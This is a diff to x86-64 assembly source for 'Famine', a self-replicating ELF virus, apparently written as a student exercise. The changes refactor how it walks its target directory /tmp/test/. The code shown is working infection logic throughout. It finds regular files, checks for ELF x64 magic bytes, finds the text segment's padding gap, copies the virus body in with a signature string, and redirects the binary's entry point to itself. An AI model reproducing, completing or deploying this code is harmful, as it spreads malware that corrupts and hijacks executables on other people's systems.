@@ -1,6 +1,4 @@
 
-; 791 bytes
-
 %include "famine.inc"
 
 bits 64
@@ -19,11 +17,17 @@ _start:
 	mov rbp, rsp
 	sub rsp, famine_size
 
-	lea rdi, [rel target_1]
-	call _traverse_dir
+	lea rdi, FAM(famine.old_pwd)
+	mov rsi, PATH_MAX
+	mov rax, 0x4f
+	syscall
 
-	lea rdi, [rel target_2]
-	call _traverse_dir
+	lea rdi, [rel target_dir]
+	call _traverse_dirs
+
+	lea rdi, FAM(famine.old_pwd)
+	mov rax, 0x50
+	syscall
 
 	add rsp, famine_size
 	lea r15, [rel _start]
@@ -41,10 +45,14 @@ _start:
 
 ; ##### LOOP THROUGH TARGET DIRECTORIES #####
 
-_traverse_dir:
-	; === ===
-	mov r12, rdi					; Saving name of directory in r12
+_traverse_dirs:
+	; === chdir(dirpath) && open(".", O_RDONLY, 0) ===
+	mov rax, 0x50
+	syscall
+	cmp rax, 0
+	jl _return
 	mov rax, SYS_OPEN
+	lea rdi, [curr_dir]
 	mov rsi, O_RDONLY
 	xor rdx, rdx
 	syscall
@@ -53,25 +61,24 @@ _traverse_dir:
 
 	; === getdents(dir_fd, struc linux_dirent *dirp, count) ===
 	mov rdi, rax												; rax has the fd of the "open" call on directory
-	lea rsi, FAM(famine.dirents)
-	xor r8, r8
-	mov FAM(famine.total_dreclen), r8							; Initializing total_dreclen to 0
+	lea rsi, FAM(famine.dirents)								; pointing 2nd argument of getents to the space on the stack
 	mov rdx, DIRENTS_BUFF_SIZE
 	mov rax, SYS_GETENTS
 	syscall
 	cmp rax, 0
 	jl _return
-	mov r15, rax
 
 	; === Beginning of the loop iterating through files of directory ===
 	_list_dir:
 		xor r14, r14											; r14 will store d_reclen
-		lea rsi, FAM(famine.dirents)							; rsi used to navigate current dirent, and ultimatly store d_name
-		add rsi, FAM(famine.total_dreclen)						; bring rsi to our current dirent (start of dirent array + total d_reclen browsed until now)
-		mov r13, rsi											; r13 will store d_type of current dirent
-		add rsi, D_RECLEN_OFF									; bring rsi to the offset at which d_reclen is located
-		mov r14w, word [rsi]									; mov d_reclen (pointed by rsi) to r14
-		add rsi, D_NAME_OFF - D_RECLEN_OFF						; bring rsi to the offset of d_name
+		lea rdi, FAM(famine.dirents)							; rdi used to navigate current dirent, and ultimatly store d_name
+		add rdi, FAM(famine.total_dreclen)						; bring rdi to our current dirent (start of dirent array + total d_reclen browsed until now)
+		mov r13, rdi											; r13 will store d_type of current dirent
+		add rdi, D_RECLEN_OFF									; bring rdi to the offset at which d_reclen is located
+		mov r14w, word [rdi]									; mov d_reclen (pointed by rdi) to r14
+		cmp r14, 0												; if d_reclen is 0, we reached the end of the directories and we exit
+		je _return
+		add rdi, D_NAME_OFF - D_RECLEN_OFF						; bring rdi to the offset of d_name
 		add FAM(famine.total_dreclen), r14						; keep track of the total d_reclen
 		sub r14, 1
 		add r13, r14											; we're adding d_reclen - 1 to r13 in order to bring it to the d_type offset
@@ -79,10 +86,7 @@ _traverse_dir:
 
 		cmp r13, 0x8											; r13 has d_type. If type is 0x8 (regular file), handle the file
 		je _file
-		check_dir_loop:
-			cmp qword FAM(famine.total_dreclen), r15
-			jge _return
-			jmp _list_dir
+		jmp _list_dir											; In all other cases, do nothing with the file
 
 
 
@@ -92,29 +96,13 @@ _traverse_dir:
 
 _file:
 	; === open(filename, O_RDWR, 0) | (path must be in rdi) ===
-	push rsi
-	lea rdi, FAM(famine.current_fpath)
-	mov rsi, r12
-	mov rdx, rdi
-
-	.dir:
-		movsb
-		cmp byte [rsi], 0
-		jne .dir
-		pop rsi
-	.fname:
-		movsb
-		cmp byte [rsi - 1], 0
-		jne .fname
-
-	mov rdi, rdx
 	mov rax, SYS_OPEN
 	mov rsi, O_RDWR
 	xor rdx, rdx
 	syscall
 	mov r8, rax													; r8 will have fd (for mmap)
 	cmp rax, 0													; Error checking (open failed)
-	jl check_dir_loop
+	jl _list_dir
 
 	; === Calculate the size of the file with lseek ===
 	mov rdi, rax
@@ -123,7 +111,7 @@ _file:
 	mov rax, SYS_LSEEK
 	syscall
 	cmp rax, 4													; Error checking (file too small)
-	jl check_dir_loop
+	jl _list_dir
 
 	; === mmap(0, filesize, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0) ===
 	xor rdi, rdi
@@ -135,27 +123,33 @@ _file:
 	syscall
 	mov FAM(famine.map_ptr), rax								; Saving mapped file pointer in famine.map_ptr
 	cmp rax, 0													; Error checking (mmap failed)
-	jl check_dir_loop
+	jl _list_dir
 
 	; === Making sure the file is an ELF file ===
-	cmp dword [rax], 0x464c457f									; Magic bytes characterising an ELF file
-	jne check_dir_loop
+	mov rax, FAM(famine.map_ptr)
+	mov dword eax, [rax]
+	cmp eax, 0x464c457f											; Magic bytes characterising an ELF file
+	jne _list_dir
 
 	; === Making sure the ELF file is x64 ===
-	cmp byte [rax + 0x4], 0x2
-	jne check_dir_loop
+	mov rax, FAM(famine.map_ptr)
+	add rax, 0x4
+	movzx rax, byte [rax]
+	cmp rax, 0x2
+	jne _list_dir
 
 	; === Getting the segments offset in file ===
+	mov rax, FAM(famine.map_ptr)
 	add rax, elf64_ehdr.e_phoff
 
 	; === Finding the text segment in file ===
 	mov r11, [rax]												; Storing e_phoff in r11
-	mov rax, FAM(famine.map_ptr)
-	mov r14, rax
+	mov r14, FAM(famine.map_ptr)
 	add r14, elf64_ehdr.e_phnum
 	movzx r14, word [r14]										; Storing e_phnum in r14
 
 	dec r14														; Decrementing by 1 since our counter starts at 0
+	mov rax, FAM(famine.map_ptr)
 	add rax, r11												; rax is now at the start of segment headers in file
 	xor r13, r13												; Used to loop through all segment headers
 	_phnum_loop:
@@ -190,7 +184,7 @@ _file:
 	sub rdi, (_finish - signature)
 	mov rax, [rel signature]
 	cmp rax, qword [rdi]
-	je check_dir_loop
+	je _list_dir
 
 	; === Calculating the space available in padding gap ===
 	mov rsi, FAM(famine.next_offset)
@@ -202,7 +196,7 @@ _file:
 	; === Comparing gap size and virus size ===
 	mov rdi, VIRUS_SIZE
 	cmp rdi, rsi
-	jg check_dir_loop
+	jg _list_dir
 
 	; === Patch ELF entry point ===
 	mov rax, FAM(famine.map_ptr)
@@ -226,7 +220,7 @@ _file:
 	mov r14, FAM(famine.orig_entry)
 	mov qword [rdi - 16], r14
 
-	jmp check_dir_loop
+	jmp _list_dir
 
 
 _is_text_segment:
@@ -250,10 +244,11 @@ _exit:
 	mov rdi, 0
 	syscall
 
-target_1	db		"/tmp/test/",0x0
-target_2	db		"/tmp/test2/",0x0
+target_dir	db		"/tmp/test/",0x0
+curr_dir	db		".",0x0
 signature	db		"Famine version 1.0 (c)oded by qroland",0x0
 host_entry	dq		_exit
 virus_entry	dq		_start
 _finish:
+
 
